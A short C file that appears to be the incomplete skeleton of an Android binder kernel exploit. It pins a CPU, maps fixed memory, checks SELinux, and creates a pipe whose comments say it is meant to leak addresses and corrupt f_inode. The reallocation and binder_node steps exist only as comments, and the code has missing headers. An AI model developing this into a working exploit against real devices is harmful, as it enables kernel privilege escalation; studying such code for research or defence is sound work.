#define _GNU_SOURCE // sched_setaffinity()
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h> // sched_setaffinity()
#include <sys/mman.h> // mmap()
#include <unistd.h> // pipe()
#include <stdbool.h>
#include <errno.h>

#include "binder.h"

int pipes[2];

// use certain core in CPU
// cpu: cpu number
// sched_setaffinity(pid, cpusetsize, mask pointer)
bool pin_cpu(int cpu){
    cpu_set_t mask;

    CPU_ZERO(&mask);
    CPU_SET(cpu, &mask);
    if(sched_setaffinity(0, sizeof(mask), &mask) < 0){
        fprintf(stderr, "[-] sched_setaffinity() error: %s\n", strerror(errno));
        return false;
    }
    printf("[+] success to schedule in %d cpu\n", cpu);
    return true;
}

char selinux_enforcing(){
    int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
    char enforce;
    read(fd, &enforce, 1); // 1: enforcing mode 
    close(fd);
    return enforce;
}

int main(){
    // memory mapping addr: 0x200000
    void *map;
    if((map  = mmap(2<<20, 0x1000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE|MAP_POPULATE, -1, 0)) == -1){
        fprintf(stderr, "[-] mmap error: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] Mapped in 0x%lx\n", map);

    pin_cpu(0);
    
    //SELinux enforcing
    printf("[+] SELinux enforcing : %c\n", selinux_enforcing());

    // create threads (for reallocation) 
    

    // create pipe to leak pipe address & corrupt f_inode
    pipe(&pipes[0]);

    // binder open
    // BINDER_DEVICE: /dev/hwbinder
    struct binder_state *bs = binder_open("/dev/hwbinder", 128*1024); 

    // create binder_node


}
